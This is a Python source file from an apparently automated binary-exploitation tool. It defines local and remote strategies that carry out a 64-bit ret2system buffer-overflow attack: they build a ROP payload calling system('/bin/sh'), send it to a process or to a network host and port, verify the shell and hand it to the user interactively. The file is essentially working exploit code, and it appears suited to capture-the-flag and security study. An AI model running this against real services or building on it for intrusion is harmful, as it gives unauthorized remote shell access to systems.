"""P7.3: x64 ret2system strategies (local + remote).

Replaces the v3.1 monolith's ``ret2_system_x64`` (L1617-1656, local)
+ ``ret2_system_x64_remote`` (L1675-1704, remote) ad-hoc functions
with two :class:`ExploitStrategy` subclasses.

The x64 variant differs from x32 in one crucial way: the payload
includes a ``ret`` alignment gadget between ``binsh`` and ``system``
to fix the 16-byte RSP alignment required by Ubuntu 18.04+ glibc's
``system()`` (which uses MOVAPS internally and SIGSEGVs on a
misaligned stack).  P6.2's :class:`Ret2SystemX64` primitive
encapsulates this; the strategy just delegates.

Per ``rebuild.md`` §6.8 P7.3 + §4.8 spec + ``refactor.md`` §3.2.2.

x64 vs x32 differences (in this file)
------------------------------------
* Reads ``ctx.gadgets_x64`` (pop_rdi + ret) — populated by
  P4.4 ``find_x64``.  Strategy ``requires`` includes
  ``has_system`` + ``binsh_in_binary``; the ROP gadgets
  are not in ``requires`` because they're loaded onto
  ctx by recon phase regardless of flag presence.
* Primitive :class:`Ret2SystemX64` already handles the
  ``other_rdi_registers`` branch (the v3.1 code at L1640-1643
  / L1697-1700 had two payload shapes based on whether the
  pop_rdi gadget also pops a trailing register).  P6.2
  rolled that complexity into the primitive.
* ``vulnerability_type`` and ``exploit_type`` string differ
  ("Buffer Overflow" / "ret2system - x64" vs "x32") to match
  v3.1's exact output for the §2.6 log-diff to stay ≥ 90%.
"""
from __future__ import annotations

import datetime
from typing import Optional

from autopwn.context import ExploitContext
from autopwn.core.logging import print_info, print_payload, print_section_header, print_success, print_warning
from autopwn.exp.base import ExploitStrategy
from autopwn.exp.priorities import RET2SYSTEM
from autopwn.exp.registry import register
from autopwn.primitives.ret2system import Ret2SystemX64
from autopwn.report.model import ExploitInfo
from autopwn.core.shell_verify import verify_shell


# ---------------------------------------------------------------------------
# Local x64 strategy
# ---------------------------------------------------------------------------


@register
class Ret2SystemX64LocalStrategy(ExploitStrategy):
    """Local 64-bit ``ret2libc system('/bin/sh')`` exploitation.

    Metadata (``requires_*``):
      * ``arch = 64`` — only matches x64 binaries.
      * ``remote = False`` — only matches ``ctx.mode == "local"``.
      * ``requires = ("has_system", "binsh_in_binary")`` — both
        PLT/symbol and string must be present.

    Priority ``RET2SYSTEM = 150`` per 附录 A.  Same priority as
    the x32 variant (per 附录 A row "ret2system_{x32,x64} = 150"
    — both strategies tried in arch-filtered branches, the
    arch filter is what keeps them mutually exclusive).

    What ``run`` does: same 6-step flow as
    :class:`Ret2SystemX32LocalStrategy` but uses
    :class:`Ret2SystemX64` (which includes the ``ret`` alignment
    gadget).  The :attr:`addresses` dict adds
    ``pop_rdi_addr`` + ``ret_addr`` for the docx report
    (matches v3.1's print at L1632 / L1633).
    """

    name = "ret2system-x64"
    priority = RET2SYSTEM
    requires_arch = 64
    requires_remote = False
    requires = ("has_system", "binsh_in_binary")

    def run(self, ctx: ExploitContext) -> bool:
        """Execute the 64-bit ret2system exploitation locally."""
        from pwn import process

        print_section_header("EXPLOITATION: ret2system - x64")
        print_payload("preparing ret2system exploit")

        # Defensive: recon phase (P4.4) must have populated
        # ``ctx.gadgets_x64`` for any x64 binary we see.  Skip
        # if it's missing rather than crash.
        if ctx.gadgets_x64 is None:
            print_info("ret2system-x64: ctx.gadgets_x64 is None; skipping")
            return False

        # Step 1: Build the payload via the P6.2 primitive.
        primitive = Ret2SystemX64()
        payload = primitive.build_payload(ctx)
        if not payload:
            print_info("ret2system-x64 primitive returned empty payload; skipping")
            return False

        # Step 2: Open local process.
        io = process(str(ctx.binary.path))

        # Step 3: Sendline.
        io.sendline(payload)

        # Step 4: Build ExploitInfo (8 fields).
        from autopwn.primitives.ret2system import (
            _lookup_system_and_binsh,
        )
        system_addr, binsh_addr = _lookup_system_and_binsh(ctx.binary.path)
        if system_addr is None or binsh_addr is None:
            return False

        info = ExploitInfo(
            exploit_type="ret2system - x64",
            payload=payload,
            padding=ctx.padding,
            addresses={
                "system_addr": system_addr,
                "bin_sh_addr": binsh_addr,
                "pop_rdi_addr": ctx.gadgets_x64.pop_rdi,
                "ret_addr": ctx.gadgets_x64.ret,
            },
            vulnerability_type="Buffer Overflow",
            architecture="x64",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )

        # Step 5: Subscribe.

        # Step 6: Interactive.
        verify_ok, verify_output = verify_shell(io, keep_alive=True)
        from autopwn.core.shell_verify import record_success_verified
        ok = record_success_verified(info, verify_ok, verify_output, ctx)
        if not ok:
            print_warning(f"Ret2SystemX64LocalStrategy:: shell verification failed (no PWNED in shell output)")
            return False
        ctx.id_output = verify_output
        io.interactive()  # v4.0.4: drop user into shell; returns when user exits
        return True


# ---------------------------------------------------------------------------
# Remote x64 strategy
# ---------------------------------------------------------------------------


@register
class Ret2SystemX64RemoteStrategy(ExploitStrategy):
    """Remote 64-bit ``ret2libc system('/bin/sh')`` exploitation.

    Mirror of :class:`Ret2SystemX64LocalStrategy` for the
    ``ctx.mode == "remote"`` branch.  Same payload (incl. ``ret``
    alignment gadget), ``pwn.remote(host, port)`` instead of
    ``pwn.process(path)``.
    """

    name = "ret2system-x64-remote"
    priority = RET2SYSTEM
    requires_arch = 64
    requires_remote = True
    requires = ("has_system", "binsh_in_binary")

    def run(self, ctx: ExploitContext) -> bool:
        """Execute the 64-bit ret2system exploitation against a remote service."""
        from pwn import remote

        if ctx.remote is None:
            print_info("ret2system-x64-remote: ctx.remote is None; skipping")
            return False
        host, port = ctx.remote

        print_section_header("EXPLOITATION: ret2system - x64 Remote")
        print_payload("preparing ret2system exploit")

        if ctx.gadgets_x64 is None:
            print_info("ret2system-x64-remote: ctx.gadgets_x64 is None; skipping")
            return False

        # Step 1: Build the payload via the P6.2 primitive.
        primitive = Ret2SystemX64()
        payload = primitive.build_payload(ctx)
        if not payload:
            print_info("ret2system-x64-remote primitive returned empty payload; skipping")
            return False

        # Step 2: Open remote connection.
        io = remote(host, port, ssl=ctx.ssl)  # v4.1.11

        # Step 3: Sendline.
        io.sendline(payload)

        # Step 4: Build ExploitInfo.
        from autopwn.primitives.ret2system import (
            _lookup_system_and_binsh,
        )
        system_addr, binsh_addr = _lookup_system_and_binsh(ctx.binary.path)
        if system_addr is None or binsh_addr is None:
            return False

        info = ExploitInfo(
            exploit_type="ret2system - x64 Remote",
            payload=payload,
            padding=ctx.padding,
            addresses={
                "system_addr": system_addr,
                "bin_sh_addr": binsh_addr,
                "pop_rdi_addr": ctx.gadgets_x64.pop_rdi,
                "ret_addr": ctx.gadgets_x64.ret,
            },
            vulnerability_type="Buffer Overflow",
            architecture="x64",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )

        # Step 5: Subscribe.

        # Step 6: Interactive.
        verify_ok, verify_output = verify_shell(io, keep_alive=True)
        from autopwn.core.shell_verify import record_success_verified
        ok = record_success_verified(info, verify_ok, verify_output, ctx)
        if not ok:
            print_warning(f"Ret2SystemX64LocalStrategy:: shell verification failed (no PWNED in shell output)")
            return False
        ctx.id_output = verify_output
        io.interactive()  # v4.0.4: drop user into shell; returns when user exits
        return True


__all__ = [
    "Ret2SystemX64LocalStrategy",
    "Ret2SystemX64RemoteStrategy",
]
